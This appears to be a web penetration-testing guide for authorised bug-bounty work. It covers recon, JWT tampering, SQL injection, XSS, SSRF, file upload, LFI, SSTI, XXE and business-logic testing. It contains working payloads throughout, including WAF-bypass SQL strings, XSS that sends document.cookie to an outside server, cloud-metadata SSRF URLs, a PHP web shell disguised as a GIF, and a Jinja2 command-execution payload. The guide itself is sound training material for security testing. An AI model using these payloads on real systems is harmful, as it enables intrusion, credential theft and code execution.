# Web Application Testing

Web is where most bug bounty findings and most junior pentest interviews live.
The bug classes below are ordered roughly by how often they actually turn up.

## Contents

- [Ground rules](#ground-rules)
- [Recon the cheap way first](#recon-the-cheap-way-first)
- [JavaScript analysis](#javascript-analysis)
- [Authentication and session](#authentication-and-session)
- [The bug classes that matter](#the-bug-classes-that-matter)
- [SQL injection](#sql-injection)
- [Cross-site scripting](#cross-site-scripting)
- [SSRF](#ssrf)
- [File upload to code execution](#file-upload-to-code-execution)
- [Path traversal and LFI](#path-traversal-and-lfi)
- [SSTI](#ssti)
- [XXE](#xxe)
- [Insecure deserialization](#insecure-deserialization)
- [Business logic](#business-logic)
- [Headers and configuration](#headers-and-configuration)

---

## Ground rules

Three limits that are not negotiable on an authorised test:

1. **No destructive payloads.** No `rm`, no dropping tables, no mass deletion.
2. **No data exfiltration.** Prove access, retrieve the minimum that proves it,
   then stop. Do not copy a customer database "to see how much there is".
3. **No persistence.** Do not create accounts, plant shells, or add users unless
   that is explicitly the agreed test.

A parameter that can be proven injectable with `' OR '1'='1` does not need a
`UNION` to prove it. Prove, screenshot, move on.

---

## Recon the cheap way first

Do all of this before touching a scanner. It takes ten minutes and it is where
the findings are.

```bash
curl -s https://<target>/robots.txt
curl -s https://<target>/sitemap.xml
curl -s https://<target>/.well-known/security.txt      # disclosure policy, may name a contact
curl -sI https://<target>/                             # read every header
```

```bash
# HTTP methods allowed. PUT, DELETE, and PROPFIND are often enabled and forgotten.
curl -s -X OPTIONS -I https://<target>/
curl -s -X TRACE -I https://<target>/                 # if TRACE works, that is a finding
```

```bash
# Content and path discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -u https://<target>/FUZZ -mc all -fc 404 -o recon.json
gobuster dir -u https://<target> -w /usr/share/wordlists/dirbuster/common.txt -x php,bak,txt,zip
```

```bash
# Subdomains
subfinder -d <domain> -silent -o subs.txt
httpx -l subs.txt -sc -title -o alive.txt     # keep only responding hosts
```

```bash
# Parameters. Hidden parameters are frequently unvalidated.
ffuf -w parameters.txt -u https://<target>/page?FUZZ=test -mc all -fc 404
arjun -u https://<target>/page -m GET            # discovers hidden parameters
```

```bash
# Historical endpoints, still running but forgotten by the developers
gau --subs <domain> | sort -u > urls.txt
waybackurls <domain> >> urls.txt
```

---

## JavaScript analysis

The highest-value modern habit. Front-end source contains live endpoints,
internal hostnames, third-party services, and frequently a key.

```bash
# Download everything and search it
wget -r -l 2 -A js,html,css -H -k -p -e robots=off https://<target>/ -P ./site
grep -rohE "https?://[a-zA-Z0-9._/-]+" ./site | sort -u          # every URL
grep -rohE "/api/[a-zA-Z0-9._/-]+" ./site | sort -u             # API paths
grep -riE "api[_-]?key|secret|token|password|authorization" ./site
```

```bash
# Source maps. If these are published you get readable original source.
curl -s https://<target>/app.js.map | head -50
curl -sI https://<target>/app.js.map
```

```bash
# Deobfuscate or beautify minified code before reading it
cat app.js | npx prettier --parser babel
cat app.js | js-beautify
node deobfuscator app.js
```

**What to look for in the source.** Endpoints never linked from the UI, the
third-party analytics and CDN in use, commented-out features, admin panels at a
different path, GraphQL endpoints, and hardcoded credentials. A commented-out
debug mode is a real pattern. Test for it.

---

## Authentication and session

```bash
# Inspect what the app actually issues you
curl -sv https://<target>/login -c cookies.txt
cat cookies.txt
```

```bash
# JWT structure, decoded. Never paste a live token into a public decoder.
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

```bash
# Verify a token, change its claims, and send it back
jwt_tool <token> -C alg -p "none"
jwt_tool <token> -C -d '{"sub":"1","role":"admin"}'
```

```bash
# Algorithm confusion, when a server accepts the public key as HMAC secret
python3 -c "
import jwt
print(jwt.decode('$TOKEN', options={'verify_signature': False}))
"
```

Look for in the token: `role`, `is_admin`, `sub`, `iss`, `exp`, and any numeric
user identifier you can increment. Roles in a client-side token are decoration
until the server stops trusting them, so test whether it does.

**Session fixation.** Log in with a known session ID, then log in as a different
user. If the ID is unchanged, the session did not rotate.

**Logout really logging out.** Log in, grab the cookie, log out, then replay the
cookie. If it still works, logout does nothing. That is a valid low-to-medium
finding and it is real more often than you would think.

**Password reset abuse.** Read the whole flow. Look for: a predictable reset
token, the token being valid for other users, an email address used as the
token, a missing expiry, and whether changing the password logs out other
sessions.

---

## The bug classes that matter

Ordered by how often they produce a real, reportable finding.

| Class | Difficulty | What gets you the finding |
|---|---|---|
| Broken access control / IDOR | Low | Increment an object ID and read someone else's data |
| Authentication weakness | Low | Null session, weak password, broken reset flow |
| Sensitive data in responses | Low | Password hashes, tokens, PII in plain responses |
| Injection (SQL, command, template) | Medium | Input reaching a query or a shell |
| SSRF | Medium | Input reaching a server-side HTTP request |
| XSS | Low | Input reflected without encoding |
| File upload to RCE | Medium | Upload reaches a location the server executes |
| Business logic | Variable | The app works as written, the logic is wrong |

Start with the first three. They require no payload crafting, they are
frequently present, and they are what a client will actually pay to have fixed.

---

## SQL injection

### Detection

```bash
# Baseline
curl -s "https://<target>/item?id=1"

# Single quote. A 500 or SQL error message is a strong signal.
curl -s "https://<target>/item?id=1'"

# Boolean differential. Same page, different result = injectable.
curl -s "https://<target>/item?id=1 AND 1=1" | wc -c
curl -s "https://<target>/item?id=1 AND 1=2" | wc -c

# Time based. Five seconds is unmistakable.
curl -s "https://<target>/item?id=1' AND SLEEP(5)-- -"
```

### Confirm with sqlmap

```bash
sqlmap -u "https://<target>/item?id=1" --batch --dbs          # identify and stop
sqlmap -u "https://<target>/item?id=1" --batch --dbs --level 3 --risk 1
sqlmap -u "https://<target>/item?id=1" -p id --batch --technique=BEU --flush
sqlmap -r request.txt --batch --level 5 --risk 2             # from a saved request
```

```bash
# Save a request from Burp, strip the Host header, point at the live host
sqlmap -r req.txt -p id --batch --dbms=mysql --technique=BEUSTQ
```

**Prove it with a filename, not a table dump.** A boolean that makes the page
change, or a `SLEEP(5)` that delays, is a complete finding. Dumping the user
table is how people get a legal letter.

```sql
-- Good proof: extract one value you already have permission to see
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -
```

```bash
# When a WAF blocks the obvious. Comment injection, spacing, and case changes.
'/**/OR/**/1=1-- -
' oR 1=1-- -
' OR/**/1=1
1' AnD '1'='1
%27%20OR%20%271%27%3D%271
```

More filter bypass technique is in [evasion-and-bypass.md](evasion-and-bypass.md).

---

## Cross-site scripting

Reflected, stored, and DOM-based. For a bounty, stored XSS in an
authenticated area is usually worth more than reflected.

```bash
# Confirm a parameter reflects
curl -s "https://<target>/search?q=testmarker123" | grep testmarker123
```

```bash
# Payload families
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(1)
"><iframe src=javascript:alert(1)>
{{7*7}}                              # SSTI probe, different bug class
${7*7}                               # Angular-style template probe
```

```bash
# DOM sinks in JavaScript sources
grep -rohE "(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval|location|document\.URL|window\.name)" ./site
```

**Obfuscation when a filter is in the way.** These are for testing filters you
are authorised to test, and for understanding why a WAF fires.

```bash
# Break up the tag name
<scr<script>ipt>alert(1)</scr</script>ipt>
# Break up the attribute
<img src=x oNerror =alert(1) >
# Encoded, in case the page is not decoding before output
<img src=x onerror=alert&#40;1&#41;>
# Using a constructor instead of a literal
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
# Newline inside the tag
<img src=x
onerror=alert(1)>
```

**Always encode your PoC so it only fires for you.** Use a unique
identifier plus your own handler rather than a bare `alert(1)`:

```html
<script>fetch('https://your-oast-server/'+document.cookie)</script>
```

---

## SSRF

Prove internal reachability, then stop. Do not pull cloud metadata from a
client's production box without agreement, even though it is technically in
scope, because the contents are often live credentials.

```bash
# Collaborator server, the correct way. OOBDNS or interactsh.
curl "https://<target>/fetch?url=http://<oast-id>.oast.live/"
# The callback proves the server made the request on your behalf.
```

```bash
# Classic bypasses. Use only where the rules of engagement cover it.
file:///etc/passwd
http://127.0.0.1:80/
http://0177.0.0.1/                    # octal
http://2130706433/                    # decimal
http://[::1]/                         # IPv6 loopback
http://127.1/
http://169.254.169.254/latest/meta-data/    # cloud metadata
gopher://127.0.0.1:6379/_INFO         # talk to redis, mysql, and more
```

```bash
# Find the metadata path that fits the cloud
curl -s http://169.254.169.254/latest/meta-data/          # AWS, GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"   # Azure
```

```bash
# Blind SSRF: no callback host available, so time the difference instead
curl -s -o /dev/null -w "%{time_total}\n" "https://<target>/fetch?url=http://10.0.0.1/"
```

Report SSRF with a DNS callback as proof. It is unambiguous and it does not
require you to touch anything internal.

---

## File upload to code execution

```bash
# What does the app tell you? The error message names the allowed types.
curl -s -F "file=@test.php;type=image/jpeg" https://<target>/upload
```

```bash
# Extension tricks, in roughly increasing order of creativity
file.php.jpg
file.php
file.phtml
file.pHp
file.php%00.jpg
file.php.
file.php::$DATA           # Windows NTFS alternate data stream
file.aspx
file.jsp
file.jspa
```

```bash
# Magic byte header. If the server trusts content, this matters more than the name.
printf '\x89PNG\r\n\x1a\n' > shell.php.png
# GIF89a is a classic, it passes naive image checks
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.gif
```

The real question is not "did it upload" but "does the server execute it".
Upload a file containing `<?php echo 'marker'; ?>`, then request the returned
path. If the marker renders, you have RCE and you stop there.

```bash
# Where do uploads land? Common guesses once you have one upload
curl -s "https://<target>/uploads/shell.php.gif"
curl -s "https://<target>/upload/shell.php.gif"
curl -s "https://<target>/images/shell.php.gif"
curl -s "https://<target>/media/shell.php.gif"
```

---

## Path traversal and LFI

```bash
# Linux
curl -s "https://<target>/?page=../../../../etc/passwd"
curl -s "https://<target>/?page=....//....//....//etc/passwd"
curl -s "https://<target>/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "https://<target>/?page=..%252f..%252f..%252fetc%252fpasswd"     # double encoding
curl -s "https://<target>/?file=/etc/passwd"                            # absolute path
curl -s "https://<target>/?file=php://filter/convert.base64-encode/resource=index.php"
```

```bash
# Windows
curl -s "https://<target>/?page=..\..\..\..\..\..\windows\win.ini"
curl -s "https://<target>/?file=C:\windows\win.ini"
```

Reading source to find a flag is a real pattern and sometimes the whole room.
`php://filter` reading `index.php` in base64 is one of the first things to try
against a PHP app with a file parameter.

---

## SSTI

```bash
# Probe and compare
{{7*7}}        ->  49   Jinja2, Twig, Nunjucks, Vue
${7*7}         ->  49   Freemarker, Velocity, Java EL
<%= 7*7 %>     ->  49   ERB, ASP
{{7*'7'}}      ->  7777777   Jinja2 string form
${{7*7}}       ->  49   Spring/Thymeleaf
```

Fingerprint the engine before attempting anything further, because a Jinja2
payload against a Twig app will not work. Burp has SSTI templates for Jinja2,
Twig, Freemarker, Velocity, and ERB, and using them is faster than writing your
own.

```python
# Jinja2. Establish RCE, then stop.
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## XXE

```bash
# Probe with a DTD pointing at a collaborator
curl -s -X POST https://<target>/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<oast-id>.oast.live/">]><data>&xxe;</data>'
```

```bash
# Confirm local file read, in-band
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

```bash
# Where it appears in real applications
SOAP request bodies
SAML assertions                       # a classic, and often unauthenticated
DOCX, XLSX, and SVG uploads           # these are just XML containers
RSS and Atom feeds
XML-RPC requests
```

SVG uploads are the one people forget. An SVG is XML, and a naive parser will
resolve external entities in it.

---

## Insecure deserialization

```bash
# Identify the format from the payload itself
rO0AB...                  # base64, starts with AC ED 00 05 -> Java
O:8:"stdClass":...        # PHP serialize
K:1:"s":...               # PHP
gASV...                   # Python pickle, base64
```

| Format | Tells you | Common where |
|---|---|---|
| Java | base64 starting `rO0AB` | Java apps, cookies, JSF ViewState |
| PHP | `O:` prefixed strings | PHP sessions, cookies |
| Python | `gASV` base64 | Python APIs, Flask sessions |
| .NET | `__VIEWSTATE`, BinaryFormatter | ASP.NET, ViewState |

```bash
# Inspect without triggering
echo "rO0AB..." | base64 -d | xxd | head
```

For Java, `ysoserial` covers the gadget chain catalogue. Identify the library
version from the stack trace or the class names first, because a chain that does
not match the library on the server will simply fail.

**Proving you can deserialize without causing damage.** Use a harmless gadget
that writes a file you can retrieve, rather than a reverse shell. It is better
evidence and it does not disturb the application.

---

## Business logic

The bugs that no scanner finds, because the code does exactly what it was
written to do. You have to understand what the app is *for* and break that.

Things to test by hand:

- **Price manipulation.** Change the price, quantity, or currency client-side. Does the server recalculate?
- **Negative quantities.** Order five, adjust to `-5`, and see what the total becomes.
- **Coupon stacking.** Apply the same discount twice. Apply expired ones.
- **Skipping steps.** Add to cart, jump straight to payment, submit without confirming.
- **Race conditions.** Fire the same request twice at once and see if both succeed. This is what double-spend bugs are.
- **Account linking.** Link an account you do not own the email or phone for.
- **Status manipulation.** Change an order status, an approval flag, a role field.
- **Quantity and inventory.** Order more than the stock.

```bash
# Replay a request with a tampered field
curl -s -X POST https://<target>/api/checkout \
  -H "Content-Type: application/json" \
  -b "session=<cookie>" \
  -d '{"item":1,"price":0.01,"qty":1}'

# Race condition. Two identical requests, sent at the same time.
for i in 1 2; do curl -s -X POST https://<target>/api/apply-coupon -b "session=<cookie>" -d '{"code":"SAVE20"}' & done; wait
```

Business logic findings are the ones clients escalate internally, because they
usually map directly to money.

---

## Headers and configuration

```bash
curl -sI https://<target>/
```

Look for, and report what each one means:

| Header | Why it matters |
|---|---|
| `Server`, `X-Powered-By` | Version disclosure, and CVE applicability |
| `Strict-Transport-Security` | Missing HSTS allows SSL stripping |
| `Content-Security-Policy` | Missing or `unsafe-inline` means XSS is far easier |
| `X-Frame-Options`, `frame-ancestors` | Missing means clickjacking is possible |
| `Set-Cookie` without `HttpOnly` | Readable by JavaScript, worsens XSS impact |
| `Set-Cookie` without `Secure` | Cookie sent over plaintext HTTP |
| `Access-Control-Allow-Origin: *` | Wildcard CORS, especially with credentials |
| `X-XSS-Protection` | Obsolete. Its presence is a finding, its absence is not |

```bash
# CORS misconfiguration test
curl -s -I https://<target>/api/user -H "Origin: https://evil.example"
# Reflecting the Origin back with Allow-Credentials is the serious case
curl -s -I https://<target>/api/user -H "Origin: https://evil.example" | grep -i "access-control"
```

```bash
# Subdomain takeover check
subfinder -d <domain> -silent | httpx -silent -json | jq -r '.host, .status_code' 2>/dev/null
nuclei -l subs.txt -t takeovers/ -severity high
```

Other common config findings: directory listing enabled, default credentials on
an admin panel, a debug mode left on, verbose error pages leaking stack traces,
and exposed admin interfaces that should not be reachable.
